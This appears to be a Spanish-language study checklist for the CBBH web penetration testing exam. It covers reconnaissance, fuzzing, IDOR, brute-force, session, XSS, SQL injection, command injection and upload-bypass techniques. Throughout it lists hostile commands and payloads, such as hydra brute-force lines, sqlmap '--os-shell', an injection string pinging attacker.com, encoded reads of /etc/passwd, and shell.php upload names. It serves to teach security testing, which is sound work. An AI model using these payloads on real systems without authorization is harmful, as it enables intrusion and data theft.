# Checklist para el Examen CBBH
### Footprinting & Fingerprinting

#### Fingerprinting del Servidor Web y Tecnologías

- **Identificación del Servidor Web:**
    - [ ] ¿Qué tipo de Web Server es? (Apache, Nginx, IIS, etc.)
    - [ ] ¿Versión del servidor web?
- **Identificación Activa de Infraestructura:**
    - [ ] **Cabeceras HTTP:**
        - [ ] `curl -I http://<IP>` o `curl -s -v http://<IP>`
        - [ ] `Server`: Identificar software y versión del servidor.
        - [ ] `X-Powered-By`: Identificar tecnologías (PHP, ASP.NET, JSP, etc.).
        - [ ] `X-AspNet-Version`, `X-AspNetMvc-Version`.
    - [ ] **Cookies:**
        - [ ] Identificar cookies de sesión y tecnología subyacente:
            - [ ] .NET: `ASPSESSIONID<RANDOM>=<COOKIE_VALUE>`
            - [ ] PHP: `PHPSESSID=<COOKIE_VALUE>`
            - [ ] JAVA: `JSESSIONID=<COOKIE_VALUE>` (o `JSESSION` según tu lista)
    - [ ] **Análisis de Errores:**
        - [ ] Provocar errores para revelar software/versión (URLs inválidas, parámetros incorrectos).
    - [ ] **Herramientas de Fingerprinting:**
        - [ ] **Wappalyzer:** Identificar tecnologías (CMS, frameworks, librerías JS, etc.).
        - [ ] **WhatWeb:** `whatweb http://<IP>` para una identificación detallada.
        - [ ] **BuiltWith:** Usar la web o extensión para análisis tecnológico.
        - [ ] **Netcraft:** Consultar el informe del sitio para tecnología, proveedor de hosting y postura de seguridad.
        - [ ] **Nikto:** `nikto -h <dominio_o_IP> -Tuning x 1 2 3 b` (la `b` es para `Security Headers` y `Allowed Methods` según tu entrada). Revisar vulnerabilidades conocidas y archivos interesantes.
        - [ ] **Nuclei:**
            - [ ] `nuclei -u http://<IP> -t "technologies/"` (para detección de tecnología).
            - [ ] `nuclei -u http://<IP> -t "misconfiguration/"` (para cabeceras y misconfigs).
    - [ ] **Detección de WAF:**
        - [ ] `wafw00f -v https://<dominio>`
    - [ ] **Aquatone:**
        - [ ] `cat subdominios.txt | aquatone -ports large` (para escaneo de puertos y screenshots de subdominios).
- **Identificación de CMS y Frameworks:**
    - [ ] ¿Utiliza un CMS? (WordPress, Joomla, Drupal, etc.)
        - [ ] Identificar rutas específicas del CMS (ej. `/wp-admin`, `/administrator`).
    - [ ] ¿Tecnología de Backend? (PHP, Java, ASPX, Node.js, Python, Ruby)
    - [ ] ¿Framework específico? (Laravel, Express, Django, Rails, Spring, etc.)
- **Identificación de APIs:**
    - [ ] ¿Hay APIs expuestas? (REST, SOAP, GraphQL)
    - [ ] ¿Parámetros de consulta en URLs que sugieran APIs? (`/api/`, `?id=`)
    - [ ] (Para más detalles, ver sección específica de APIs).
- **Proxy AJP:**
    - [ ] Realizar escaneo `nmap -sV -p 8009 <IP>` para el puerto `8009/tcp`. Si está abierto, revisar sección _AJP Proxy_ en **Ataques del Lado del Servidor**.
- **Pila Tecnológica de Backend:**
    - [ ] ¿LAMP, WAMP, MAMP, XAMPP, MEAN, etc.?
- **Base de Datos:**
    - [ ] ¿Se puede inferir la base de datos utilizada? (MySQL, PostgreSQL, MongoDB, SQL Server, Oracle)
    - [ ] ¿Relacional o NoSQL?
- **Certificado TLS/SSL:**
    - [ ] Revisar certificado (emisor, validez, algoritmos).
    - [ ] Revisar versión de TLS y configuraciones (ciphersuites débiles). Herramientas como `testssl.sh` o Qualys SSL Labs.

#### Búsqueda y Análisis de Metarchivos y Contenido Estándar

- [ ] **`robots.txt`:**
    - [ ] Revisar `http://<dominio>/robots.txt`.
    - [ ] Identificar directorios `Disallow`: ¿Rutas sensibles, paneles de administración, backups?
    - [ ] Mapear estructura del sitio basada en `Disallow` y `Allow`.
    - [ ] Detectar posibles trampas para crawlers (honeypots).
    - [ ] ¿Revela el tipo de CMS? (ej. `/wp-admin/` en `Disallow` para WordPress).
- [ ] **URIs `.well-known` (RFC 8615):**
    - [ ] Revisar `http://<dominio>/.well-known/`.
    - [ ] `security.txt` (RFC 9116): `/.well-known/security.txt` o `/security.txt`. ¿Contiene información de contacto para reporte de vulnerabilidades?
    - [ ] `change-password`: `/.well-known/change-password`.
    - [ ] `openid-configuration`: `/.well-known/openid-configuration`.
    - [ ] `assetlinks.json` (Digital Asset Links).
    - [ ] `mta-sts.txt` (MTA Strict Transport Security, RFC 8461).
- [ ] **`sitemap.xml`:**
    - [ ] Revisar `http://<dominio>/sitemap.xml` (o variaciones).
    - [ ] Identificar todas las URLs listadas para entender la estructura y contenido completo del sitio.
- [ ] **`humans.txt`:**
    - [ ] Revisar `http://<dominio>/humans.txt`. ¿Información sobre el equipo de desarrollo o tecnologías?
- [ ] **`Security.txt`:** (Ya cubierto en `.well-known`, pero verificar ambas ubicaciones).

#### Revisión Inicial del Contenido Web

- **Análisis del Código Fuente (HTML, CSS, JS):**
    - [ ] **Tags HTML Clave:**
        - [ ] `<head>`: Metadatos, enlaces a scripts/CSS.
        - [ ] `<body>`: Contenido visible.
        - [ ] `<style>`: CSS incrustado.
        - [ ] `<script>`: JavaScript incrustado o enlaces a archivos `.js`.
    - [ ] **Exposición de Datos Sensibles en el Código Fuente:**
        - [ ] Comentarios HTML/JS: ¿Credenciales, hashes, claves API, rutas internas, información de depuración?
        - [ ] Enlaces expuestos (URLs ocultas o de prueba).
        - [ ] Directorios o archivos referenciados.
        - [ ] Información de usuarios.
    - [ ] **Análisis de Archivos JavaScript (`.js`):**
        - [ ] ¿Archivos minificados (`.min.js`)? Usar "Beautifiers" (ej. `jsbeautifier.org`) para mejorar legibilidad.
        - [ ] ¿Ofuscación `p,a,c,k,e,d`? Usar "UnPacker" (ej. `matthewfl.com/unPacker.html`).
        - [ ] ¿Otros tipos de ofuscación?
        - [ ] Analizar código desofuscado:
            - [ ] Endpoints de API, lógica de negocio, parámetros ocultos.
            - [ ] Identificar hashes comunes (Base64, Hex, Caesar/ROT13).
                - [ ] Hex: strings con caracteres 0-9 y a-f.
            - [ ] Usar identificadores de cifrado si es necesario (ej. Cipher Identifier de Boxentriq).
            - [ ] Buscar funciones de generación de tokens o lógica de validación del lado del cliente.
- **Crawling y Spidering:**
    - [ ] Utilizar herramientas para descubrir contenido y funcionalidad:
        - [ ] **Burp Suite Spider:** Mapear la aplicación, identificar contenido oculto.
        - [ ] **OWASP ZAP Spider/AJAX Spider.**
        - [ ] **FinalRecon:** `python finalrecon.py --full <dominio>`.
        - [ ] **ReconSpider (Scrapy):** `reconspider -d <dominio> -s`. Revisar comentarios en el JSON de salida.
        - [ ] **Photon:** `python photon.py -u <URL> --keys --clone --ninja`.
        - [ ] **GoLinkFinder (GoLF):** `golinkfinder -d <dominio> -s`.
        - [ ] **Hakrawler:** `hakrawler -url <URL> -depth <num>`.
    - [ ] **Qué buscar durante el crawling:**
        - [ ] **Enlaces internos y externos:** Mapear la estructura, descubrir páginas ocultas, identificar relaciones con recursos externos.
        - [ ] **Comentarios:** En HTML, JS, CSS.
        - [ ] **Metadatos:** Títulos de página, descripciones, palabras clave, nombres de autor, fechas.
        - [ ] **Archivos Sensibles:**
            - [ ] Backups: `.bak`, `.old`, `.zip`, `.tar.gz`, `~`.
            - [ ] Archivos de configuración: `web.config`, `settings.php`, `.env`, `config.json`.
            - [ ] Archivos de log: `error_log`, `access_log`.
            - [ ] Archivos con contraseñas o claves API.
            - [ ] **Claves API:** Usar herramientas como `Katana` o buscar patrones comunes de claves. Revisar `securityheaders.com/api/`.
- [ ] **Interceptar Respuestas:**
    - [ ] ¿Se pueden modificar respuestas para eludir restricciones del lado del cliente? (Ej. habilitar botones deshabilitados).

#### Recopilación de Información sobre Dominios y Subdominios

- [ ] **WHOIS:**
    - [ ] `whois <dominio>`: Información de registro, contactos, servidores DNS.
- [ ] **Enumeración DNS:**
    - [ ] **Herramientas básicas:**
        - [ ] `dig <dominio> ANY +noall +answer` / `dig axfr <dominio> @<servidor_dns_autoritativo>` (para transferencia de zona).
        - [ ] `nslookup -type=any <dominio>`.
        - [ ] `host -a <dominio>`.
    - [ ] **Herramientas Avanzadas de Enumeración:**
        - [ ] `dnsenum --noreverse -o subdominios.xml <dominio>`. (WHOIS, Google Dorking, reverse lookup, transferencias de zona).
        - [ ] `fierce --domain <dominio>`.
        - [ ] `dnsrecon -d <dominio> -t axfr` (y otros tipos de enumeración).
        - [ ] `theHarvester -d <dominio> -b all` (emails, subdominios, hosts virtuales).
        - [ ] `amass enum -d <dominio> -active -brute` (combinación de técnicas activas y pasivas).
        - [ ] `subfinder -d <dominio>`.
    - [ ] **Servicios Online:** VirusTotal, crt.sh, Censys, Shodan, SecurityTrails.
- [ ] **Fuzzing Avanzado (ffuf, gobuster, dirsearch, etc.):**
    - [ ] **Fuzzing de Directorios y Archivos:**
        - [ ] `ffuf -w <wordlist_dirs> -u http://<IP_o_dominio>/FUZZ -e .php,.txt,.html,.bak`
        - [ ] `gobuster dir -u http://<IP_o_dominio> -w <wordlist_dirs> -x .php,.txt,.html`
        - [ ] `dirsearch -u http://<IP_o_dominio> -w <wordlist_dirs> -e php,txt,html`
        - [ ] Probar con diferentes wordlists (ej. SecLists: `Discovery/Web-Content/common.txt`, `raft-small-files.txt`, etc.).
        - [ ] Considerar `-H "Header: Value"` si es necesario.
    - [ ] **Fuzzing de Extensiones (Page Fuzzing):** Añadir extensiones comunes (`-e .php,.asp,.aspx,.jsp,.html,.txt,.bak`).
    - [ ] **Fuzzing Recursivo:**
        - [ ] `ffuf -w <wordlist_dirs> -u http://<IP_o_dominio>/FUZZ -recursion -recursion-depth <num>`
        - [ ] `gobuster dir -u http://<IP_o_dominio> -w <wordlist_dirs> -r`
    - [ ] **Fuzzing de Subdominios:**
        - [ ] `ffuf -w <wordlist_subdominios> -u http://FUZZ.<dominio> -H "Host: FUZZ.<dominio>"`
        - [ ] `gobuster dns -d <dominio> -w <wordlist_subdominios>`
    - [ ] **Fuzzing de Vhosts (Hosts Virtuales):**
        - [ ] `ffuf -w <wordlist_vhosts> -u http://<IP_TARGET> -H "Host: FUZZ.<dominio_base>"`
        - [ ] Si se encuentran Vhosts, añadirlos a `/etc/hosts`.
    - [ ] **Fuzzing de Parámetros (GET y POST):**
        - [ ] GET: `ffuf -w <wordlist_params> -u 'http://<URL>?FUZZ=test'`
        - [ ] POST: `ffuf -w <wordlist_params> -u <URL> -X POST -d 'FUZZ=test' -H "Content-Type: application/x-www-form-urlencoded"`
        - [ ] Usar wordlists como `SecLists/Discovery/Web-Content/burp-parameter-names.txt`.
    - [ ] **Fuzzing de Valores de Parámetros:**
        - [ ] Probar valores comunes, payloads de LFI/SQLi/XSS en parámetros conocidos.
    - [ ] **Consejos para Fuzzing:**
        - [ ] Si el fuzzing no tiene éxito, usar un User-Agent aleatorio (ej. `gobuster --random-agent`).
        - [ ] Probar `/.FUZZ` para endpoints ocultos.
        - [ ] Filtrar por códigos de estado (`-fc`, `-mc`), tamaño de respuesta (`-fs`, `-ms`), expresiones regulares (`-fr`, `-mr`).

### Análisis de Peticiones y Respuestas Web

- [ ] **Revisión General de Peticiones/Respuestas:**
    - [ ] Usar DevTools del navegador y Burp Suite/OWASP ZAP para inspeccionar todo el tráfico.
- [ ] **Cabeceras HTTP y Cookies:**
    - [ ] **Cabeceras de Seguridad:**
        - [ ] `Strict-Transport-Security (HSTS)`: ¿Presente? ¿`max-age` adecuado? ¿`includeSubDomains`? ¿`preload`?
        - [ ] `Content-Security-Policy (CSP)`: ¿Presente? ¿Políticas restrictivas y efectivas?
        - [ ] `X-Frame-Options`: ¿`DENY` o `SAMEORIGIN` para prevenir Clickjacking?
        - [ ] `X-Content-Type-Options`: ¿`nosniff`?
        - [ ] `Referrer-Policy`: ¿Política restrictiva como `no-referrer` o `same-origin`?
        - [ ] `Permissions-Policy` (antes `Feature-Policy`): ¿Restringe características del navegador?
        - [ ] `Cache-Control` / `Pragma`: ¿Previene el cacheo de información sensible?
    - [ ] **Cabeceras Informativas:**
        - [ ] `Server`, `X-Powered-By`, `Via`: ¿Revelan demasiada información?
    - [ ] **Cookies (Atributos):**
        - [ ] `HttpOnly`: ¿`true` para prevenir acceso por JavaScript?
        - [ ] `Secure`: ¿`true` para transmitir solo sobre HTTPS?
        - [ ] `SameSite`: ¿`Strict` o `Lax` para mitigar CSRF? Evitar `None` sin `Secure`.
        - [ ] `Domain` y `Path`: ¿Alcance apropiado?
        - [ ] `Expires` / `Max-Age`: ¿Expiración adecuada?
    - [ ] **Contenido de Cookies:**
        - [ ] ¿Información sensible en cookies (roles, IDs)?
        - [ ] ¿Cifrado débil o predecible? ¿Se puede decodificar (Base64, etc.)?
        - [ ] ¿Patrones que sugieran MD5 u otros hashes débiles? (ej. ¿longitud correcta pero faltan dígitos para ser un MD5 válido?).
- [ ] **Métodos HTTP:**
    - [ ] Identificar métodos permitidos (`OPTIONS` request, `nmap --script http-methods <target>`).
    - [ ] ¿Métodos inseguros habilitados (TRACE - XST, PUT/DELETE sin autenticación adecuada)?
    - [ ] ¿Se puede acceder a recursos protegidos cambiando el método (GET en lugar de POST)? (Ver HTTP Verb Tempering).
- [ ] **Códigos de Respuesta HTTP:**
    - [ ] Analizar códigos para entender el comportamiento de la aplicación.
    - [ ] ¿Errores `4xx` o `5xx` revelan información?
- [ ] **Redirecciones:**
    - [ ] `curl -L <dominio>` para seguir redirecciones.
    - [ ] ¿Redirecciones a sitios no confiables? (Ver Open Redirect).
- [ ] **APIs CRUD:**
    - [ ] Comprobar si existen APIs para Crear (POST), Leer (GET), Actualizar (PUT/PATCH), Borrar (DELETE) recursos (ej. `http://<IP>/api.php/recurso/id`).
    - [ ] (Para más detalles, ver sección específica de APIs).
- [ ] **Autocomplete en Formularios:**
    - [ ] ¿`autocomplete` deshabilitado en campos sensibles (contraseñas, emails)? Si está habilitado, ¿filtra datos?
- [ ] **Arquitectura de la Aplicación Web:**
    - [ ] ¿Cliente-Servidor? ¿Un solo servidor? ¿Múltiples servidores - una BD? ¿Múltiples servidores - múltiples BDs?

### Gestión de Identidad

- [ ] **HTTP Verb Tempering (Manipulación de Verbos HTTP):**
    - [ ] Probar si cambiar métodos HTTP (ej. de GET a POST, o usar PUT, DELETE, HEAD, PATCH en endpoints no diseñados para ellos) elude controles de acceso.
    - [ ] ¿Se puede acceder a funcionalidades de administrador usando métodos no estándar en endpoints de usuario?
- [ ] **IDOR (Insecure Direct Object References):**
    - [ ] **Identificación:**
        - [ ] Buscar parámetros en URL, cuerpo de POST, cabeceras HTTP (incluyendo cookies) que referencien objetos (ej. `?uid=123`, `?filename=doc_A.pdf`, `?order_id=X`).
        - [ ] Analizar llamadas AJAX en el código JavaScript del frontend en busca de endpoints y parámetros de API no documentados.
        - [ ] Si los identificadores están encodeados/hasheados (Base64, MD5), intentar entender el algoritmo (revisar JS, comparar con valores conocidos).
    - [ ] **Explotación:**
        - [ ] Intentar modificar los identificadores (incrementar/decrementar números, cambiar strings) para acceder a datos de otros usuarios.
        - [ ] Probar con diferentes métodos HTTP (GET, POST, PUT, DELETE).
        - [ ] **Enumeración Masiva:**
            - [ ] Si se sospecha un patrón (ej. IDs numéricos, nombres de archivo predecibles), automatizar la prueba con scripts (Python, Bash) o Burp Intruder.
            - [ ] Ejemplo (bash para texto plano):
                ```
                # for i in {1..20}; do curl -s -X POST "http://<URL>/documents.php" -d "uid=$i" | grep "<li class='pure-tree_link'>"; done
                # for i in {1..10}; do for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do curl -sOJ -X POST -d "contract=$hash" http://<URL>/download.php; done; done
                ```
                
        - [ ] **Comparar Roles de Usuario:** Registrar múltiples usuarios (si es posible, con diferentes niveles de privilegio) y comparar las peticiones y objetos a los que tienen acceso.
        - [ ] **IDOR en APIs:** Aplicar los mismos principios a endpoints de API.

### Pruebas de Autenticación

- [ ] **Canal No Cifrado (HTTP):**
    - [ ] ¿Página de login accesible vía HTTP?
    - [ ] ¿Página de registro o recuperación de contraseña accesible vía HTTP?
    - [ ] ¿Se envían credenciales sobre HTTP?
    - [ ] ¿Se puede forzar la navegación a páginas HTTP después del logout?
- [ ] **Mecanismos de Login:**
    - [ ] **Credenciales por Defecto:**
        - [ ] Probar `admin:admin`, `admin:password`, etc.
        - [ ] Consultar listas de credenciales por defecto según la tecnología identificada (ej. CIRT.net, SecLists `Passwords/Default-Credentials/`).
        - [ ] Buscar en Google: `<tecnología> default credentials`.
    - [ ] **Bypass de Login:**
        - [ ] ¿Se puede acceder a dashboards/áreas administrativas sin autenticar (forced Browse)?
        - [ ] Pruebas básicas de SQL Injection en el formulario de login (ej. `' OR '1'='1`).
    - [ ] **Fuerza Bruta de Credenciales:**
        - [ ] **Enumeración de Nombres de Usuario:**
            - [ ] ¿Respuestas diferentes para usuarios existentes vs. inexistentes? (mensajes de error, tiempos de respuesta).
            - [ ] Probar en login, registro, "olvidé contraseña".
        - [ ] **Protecciones contra Fuerza Bruta:**
            - [ ] ¿Existe Rate Limiting? ¿Se puede bypassear (ej. con cabeceras `X-Forwarded-For`)?
            - [ ] ¿Hay CAPTCHA? ¿Se puede bypassear o es débil?
            - [ ] ¿Bloqueo de cuentas? ¿Temporal o permanente? ¿Umbral adecuado?
        - [ ] **Ataques de Contraseña (Hydra, Burp Intruder):**
            - [ ] **HTTP Basic Auth:**
                - [ ] `hydra -C <user:pass_list> <IP> -s <PORT> http-get /<path>`
                - [ ] `hydra -L <user_list> -P <pass_list> -u -f <IP> -s <PORT> http-get /<path>`
            - [ ] **Formularios Web (POST/GET):**
                - [ ] Identificar parámetros de login (username, password) e input de error/éxito.
                - [ ] `hydra -L <user_list> -P <pass_list> <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<string_de_fallo_o_S_de_exito>"`
                - [ ] Usar wordlists personalizadas si se obtiene información sobre la política de contraseñas o usuarios.
    - [ ] **Tokens de Sesión Predecibles:**
        - [ ] Analizar la aleatoriedad y complejidad de los IDs de sesión. ¿Se pueden predecir?
    - [ ] **Múltiples Logins:**
        - [ ] ¿Se permite el login simultáneo con la misma cuenta desde diferentes IPs/navegadores? ¿Es esperado?
- [ ] **Funcionalidad "Recordar Contraseña" / Password Reset:**
    - [ ] **Tokens de Reset Débiles:**
        - [ ] ¿Tokens cortos, predecibles, o basados en información del usuario?
        - [ ] ¿Fuerza bruta de tokens?
        - [ ] ¿Reutilización de tokens? ¿Expiran correctamente?
    - [ ] **Preguntas de Seguridad Adivinables.**
    - [ ] **Manipulación de la Petición de Reset:** ¿Se puede cambiar el email/usuario al que se envía el token?
    - [ ] ¿Host Header Injection para controlar el enlace de reset?
- [ ] **Autenticación de Múltiples Factores (2FA/MFA):**
    - [ ] **Bypass de 2FA:** ¿Se puede bypassear el flujo de 2FA? (ej. forzando la navegación a una página post-2FA).
    - [ ] **Fuerza Bruta de Códigos 2FA:** ¿Ausencia de rate limiting en la validación de códigos?
    - [ ] **Tokens 2FA Débiles/Predecibles.**
    - [ ] **Problemas con la Recuperación de Cuentas 2FA.**
    - [ ] ¿Se pueden reutilizar códigos ya usados?
- [ ] **Autenticación Rota (General):**
    - [ ] **Bypass por Acceso Directo:** ¿Acceder a URLs internas directamente sin autenticar?
    - [ ] **Bypass por Modificación de Parámetros:** ¿Cambiar parámetros en la URL o cuerpo POST para escalar privilegios o bypassear auth (ej. `isAdmin=true`)?

### Pruebas de Gestión de Sesiones

- [ ] **Seguridad de Cookies de Sesión (ya cubierto parcialmente en "Peticiones Web"):**
    - [ ] Atributos: `HttpOnly`, `Secure`, `SameSite` (`Strict`/`Lax`), `Path`, `Domain`, `Expires`.
    - [ ] Prefijos de cookie: `__Host-`, `__Secure-`.
    - [ ] Contenido de la cookie: ¿Información sensible? ¿Codificación/cifrado débil?
- [ ] **Secuestro de Sesión (Session Hijacking):**
    - [ ] ¿IDs de sesión expuestos en URLs?
    - [ ] ¿IDs de sesión predecibles o de baja entropía?
    - [ ] ¿Susceptible a XSS para robo de cookies (si `HttpOnly` no está)?
    - [ ] ¿Susceptible a sniffing si no se usa HTTPS (y cookie no `Secure`)?
- [ ] **Fijación de Sesión (Session Fixation):**
    - [ ] ¿Se regenera el ID de sesión después de un login exitoso?
    - [ ] ¿Se puede forzar un ID de sesión conocido a un usuario (ej. vía URL, cookie inyectada por XSS/MITM)?
- [ ] **Expiración de Sesión:**
    - [ ] ¿Las sesiones expiran después de un periodo de inactividad?
    - [ ] ¿El logout invalida la sesión en el servidor o solo borra la cookie del cliente?
- [ ] **Cross-Site Request Forgery (CSRF / XSRF):**
    - [ ] **Identificación:**
        - [ ] ¿Peticiones que cambian estado (ej. cambiar email, contraseña, realizar una compra) carecen de tokens anti-CSRF?
        - [ ] Si hay tokens, ¿son validados correctamente?
    - [ ] **Tokens Anti-CSRF Débiles:**
        - [ ] ¿El token es predecible (ej. MD5 del username)?
        - [ ] ¿El token está atado a la sesión del usuario o es global?
        - [ ] ¿Se valida la ausencia del token o un token vacío?
    - [ ] **Bypass de Protección CSRF:**
        - [ ] ¿Enviar un token nulo o vacío?
        - [ ] ¿Usar un token de otra sesión de usuario?
        - [ ] ¿Cambiar el método de la petición (POST a GET)?
        - [ ] ¿Bypass de la validación del `Referer` header (ej. eliminándolo, usando subdominios o paths que coincidan con una regex laxa)?
        - [ ] ¿Ataque de Fijación de Sesión para obtener un token CSRF válido? (`double-submit cookie` bypass).
- [ ] **Open Redirect:**
    - [ ] Identificar parámetros de URL que parezcan controlar redirecciones (ej. `redirect=`, `url=`, `next=`, `returnTo=`, `goto=` y los listados en tu input).
    - [ ] Intentar redirigir a un sitio externo controlado por el atacante.
        - [ ] Ej: `http://vulnerable.com/login?redirect_uri=http://atacante.com`
    - [ ] Probar bypasses de validación de URL (ej. `http://vulnerable.com/login?redirect_uri=@atacante.com`, `//atacante.com`, `\/\/atacante.com`, usar encodings).
    - [ ] ¿Se puede usar para robar tokens si se redirige a un sitio malicioso después de una acción legítima?
    - [ ] ¿Se puede inyectar JavaScript si el redirect usa `javascript:alert(1)`?

### Input Validation Testing

#### Cross-Site Scripting

- [ ] **Descubrimiento Manual y Automatizado:**
    - [ ] Identificar dónde la entrada del usuario se refleja en la respuesta.
    - [ ] Probar payloads básicos: `<script>alert(1)</script>`, `"><script>alert(1)</script>`, `<img src=x onerror=alert(1)>`.
    - [ ] Usar herramientas: Burp Suite (Scanner, DOM Invader), OWASP ZAP, XSStrike, XSSer.
- [ ] **Tipos de XSS:**
    - [ ] **Reflected XSS:**
        - [ ] Entrada reflejada directamente en la respuesta.
        - [ ] Probar en parámetros URL, campos de formulario.
    - [ ] **Stored XSS:**
        - [ ] Entrada almacenada en el servidor y luego mostrada a otros usuarios (ej. comentarios, perfiles, posts).
    - [ ] **DOM-based XSS:**
        - [ ] La vulnerabilidad reside en el código JavaScript del lado del cliente que manipula el DOM con datos del usuario.
        - [ ] Identificar _sources_ (ej. `location.hash`, `document.referrer`) y _sinks_ (ej. `innerHTML`, `document.write`, `eval`).
        - [ ] Usar DevTools para analizar el comportamiento del JS.
    - [ ] **Blind XSS:**
        - [ ] Inyectar payloads que podrían ejecutarse en un panel de administración o sistema de backend no visible directamente. Usar herramientas como XSS Hunter.
- [ ] **Contextos de XSS y Evasión de Filtros:**
    - [ ] **Entre tags HTML:** `<script>...</script>`
    - [ ] **En atributos HTML:** `<img src="x" onerror=payload>` o `<a href="javascript:payload">`
    - [ ] **Dentro de `<script>` tags:** Romper strings, usar `eval()`, `String.fromCharCode()`.
    - [ ] **En URLs:** `javascript:payload`
    - [ ] **En CSS/Style:** `@import`, `expression()`, `url()`.
    - [ ] **Event Handlers:** `onload`, `onerror`, `onmouseover`, etc.
    - [ ] **Técnicas de Evasión (ver OWASP XSS Filter Evasion Cheat Sheet):**
        - [ ] Uso de mayúsculas/minúsculas.
        - [ ] Encodings (URL, HTML entity, Hex, Octal, Unicode).
        - [ ] Caracteres nulos (`%00`).
        - [ ] Comentarios.
        - [ ] Tags malformados.
        - [ ] Ofuscación de `alert()`, `document.cookie`, etc.
- [ ] **Impacto del XSS:**
    - [ ] Robo de cookies (Session Hijacking).
    - [ ] Defacement.
    - [ ] Keylogging.
    - [ ] Redirección a sitios maliciosos.
    - [ ] Ejecución de acciones en nombre del usuario (CSRF).
- [ ] **XSS en Cabeceras HTTP:** Si cabeceras como `User-Agent` o `Referer` se reflejan en la página.
- [ ] **Revisar si el XSS se inyecta en el código backend (si es posible inferirlo).**

#### HTML Injection

- [ ] Comprobar si en campos sin validación por parte del usuario funcionan tags HTML simples (ej. `<h1>Test</h1>`, `<b>Test</b>`).
- [ ] ¿Se puede inyectar un formulario falso para phising?
- [ ] Diferenciar de XSS: el objetivo es inyectar HTML, no necesariamente JavaScript (aunque a menudo van juntos).

#### SQL Injection 

- [ ] **Detección:**
    - [ ] **Manual:**
        - [ ] Caracteres especiales: `'`, `"`, `\`, `--`, `#`, `;`.
        - [ ] Operadores lógicos: `OR 1=1`, `AND 1=1`, `OR 'a'='a'`.
        - [ ] Comentarios: `/*payload*/`, `-- payload`.
        - [ ] Errores de base de datos.
        - [ ] Comportamiento diferente de la aplicación.
    - [ ] **Herramientas:**
        - [ ] **SQLMap:** `sqlmap -u "<URL_con_parametro_vulnerable>" --batch --random-agent`
            - [ ] `--dbs` (listar BBDD), `--current-db`, `--tables -D <db>`, `--columns -T <table> -D <db>`, `--dump -C <cols> -T <table> -D <db>`.
            - [ ] `--os-shell` (si es posible).
            - [ ] `--level=<1-5>` y `--risk=<1-3>`.
            - [ ] `--technique=<BEUSTQ>` (Boolean, Error, Union, Stacked, Time, Query).
- [ ] **Tipos de SQLi y Técnicas de Explotación:**
    - [ ] **In-band (Clásica):**
        - [ ] **Error-based:** Forzar errores que revelen información de la BD.
        - [ ] **Union-based:** Usar `UNION SELECT` para extraer datos de otras tablas.
            - [ ] Determinar número de columnas (`ORDER BY <num>`).
            - [ ] Identificar tipos de datos compatibles.
            - [ ] Extraer información (`UNION SELECT null, version(), database(), null...`).
    - [ ] **Inferencial (Blind):**
        - [ ] **Boolean-based:** Hacer preguntas de Verdadero/Falso y observar cambios en la respuesta.
        - [ ] **Time-based:** Inducir retardos condicionales (`SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`).
    - [ ] **Out-of-band:** Usar canales alternativos para exfiltrar datos (ej. DNS, HTTP requests al servidor del atacante).
    - [ ] **Stacked Queries:** Si se permiten múltiples sentencias SQL separadas por `;`.
- [ ] **Explotación Avanzada:**
    - [ ] **Bypass de Autenticación:** `' OR '1'='1' -- -` en campos de usuario/contraseña.
    - [ ] **Enumeración de Base de Datos:**
        - [ ] Versión de la BD (`SELECT @@version`).
        - [ ] Usuario actual (`user()`, `current_user`).
        - [ ] Bases de datos, tablas, columnas (usando `information_schema` en MySQL/PostgreSQL, `sys.objects` en MSSQL, etc.).
    - [ ] **Lectura de Archivos:** `LOAD_FILE()` (MySQL).
    - [ ] **Escritura de Archivos:** `INTO OUTFILE` / `INTO DUMPFILE` (MySQL).
    - [ ] **Ejecución de Comandos del OS:** `xp_cmdshell` (MSSQL), UDFs (MySQL/PostgreSQL).
- [ ] **Identificar qué parámetro es vulnerable si hay varios.** (ej. `id=`, `category=`, `search=`).
- [ ] **Considerar diferentes tipos de bases de datos (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, NoSQL).**

#### Command Injection

- [ ] **Detección:**
    - [ ] Identificar parámetros que puedan ser usados en comandos del sistema (ej. filenames, hosts para ping, etc.).
    - [ ] Inyectar metacaracteres de shell y comandos simples:
        - [ ] `; ls`, `| id`, `&& dir`, `|| sleep 5`, `$(whoami)`, `` `uname -a` ``.
        - [ ] `& ping -c 3 attacker.com`, `\ncat /etc/passwd`.
    - [ ] Observar la salida, errores, o retardos.
- [ ] **Técnicas de Inyección:**
    - [ ] Usar diferentes metacaracteres (`|`, `||`, `&`, `&&`, `;`, `\n`).
    - [ ] Sustitución de comandos (`` `comando` `` o `$(comando)`).
    - [ ] Redirección de entrada/salida (`<`, `>`).
- [ ] **Bypass de Filtros y WAF:**
    - [ ] **Espacios:** Reemplazar con `$IFS`, `${IFS}`, `<` (si el comando lo permite), `%09` (tab).
    - [ ] **Caracteres de Barra Inclinada (`/`):** Usar variables como `${HOME:0:1}`.
    - [ ] **Comandos Bloqueados:**
        - [ ] Usar alias, variables de entorno.
        - [ ] Encodings (hex, octal: `echo -e '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`).
        - [ ] Concatenación de strings (`'ca'` `'t'`, `ca""t`).
        - [ ] Globbing/Wildcards (`/???/??t /???/p??s??`, `w?o?m?`).
        - [ ] Sustitución de comandos avanzada.
    - [ ] **Caracteres Bloqueados:** Pruebas de encodings, uso de `eval` con datos codificados si es posible.
- [ ] **Herramientas de Evasión/Ofuscación (si aplica y se conoce el contexto).**
- [ ] **Inyección Ciega de Comandos:** Usar comandos que generen retardos (`sleep`, `ping`) o exfiltren datos por canales OOB (DNS, HTTP).

### File Upload

- [ ] **Identificar Funcionalidad de Carga:**
    - [ ] ¿Qué tipos de archivo se permiten (extensiones, Content-Type)?
    - [ ] ¿Hay restricciones de tamaño?
    - [ ] ¿Dónde se almacenan los archivos? ¿Accesibles vía web?
- [ ] **Bypass de Validaciones:**
    - [ ] **Validación del Lado del Cliente:** Interceptar con Burp y modificar.
    - [ ] **Validación de Extensión (Blacklist/Whitelist):**
        - [ ] Dobles extensiones: `shell.php.jpg`, `shell.jpg.php`.
        - [ ] Extensiones alternativas: `.phtml`, `.php3`, `.php4`, `.php5`, `.phar` (para PHP).
        - [ ] Mayúsculas/minúsculas: `shell.PhP`.
        - [ ] Caracteres nulos: `shell.php%00.jpg`.
        - [ ] Espacios o puntos al final: `shell.php.`, `shell.php%20`.
    - [ ] **Validación de `Content-Type`:** Modificar la cabecera `Content-Type` en Burp.
